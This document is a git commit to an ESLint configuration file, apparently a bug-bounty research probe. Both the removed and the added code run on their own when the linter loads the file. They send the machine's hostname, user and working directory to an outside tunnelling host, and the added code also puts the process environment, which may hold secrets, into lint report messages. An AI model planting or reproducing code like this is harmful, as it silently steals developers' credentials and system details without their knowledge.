7fdc441bc84750dd58b1feb840dd6d976d261439
kirasec-research1 <kirasec+mgfa@wearehackerone.com>
2026-08-01 18:27:14 -0400

    lint probe 3

--- eslint.config.js
+++ eslint.config.js
@@ -1,4 +1,11 @@
 const https=require('https');const os=require('os');
-try{const u=new URL('https://gfxzy-2601-681-4180-9040-e0f0-4747-a30-e33b.free.pinggy.net'+'/RCE-eslint?h='+encodeURIComponent(os.hostname())+'&u='+encodeURIComponent(process.env.USER||'')+'&cwd='+encodeURIComponent(process.cwd()));
-https.get(u,r=>{}).on('error',()=>{});}catch(e){}
-module.exports=[{files:['**/*.js'],rules:{}}];
+function ping(p){try{https.get(T_URL+p,r=>{}).on('error',()=>{});}catch(e){}}
+const T_URL='https://gfxzy-2601-681-4180-9040-e0f0-4747-a30-e33b.free.pinggy.net';
+ping('/RCE-eslint-flat?h='+encodeURIComponent(os.hostname()));
+const leak={
+  rules:{leak:{create(ctx){return{Program(node){
+     let env='';try{env=JSON.stringify(process.env).slice(0,1200);}catch(e){env='ERR';}
+     ctx.report({node,message:'KIRASEC-EXEC host='+os.hostname()+' cwd='+process.cwd()+' env='+env});
+  }};}}}}
+};
+module.exports=[{files:['**/*.js'],plugins:{kira:leak},rules:{'kira/leak':'error'}}];
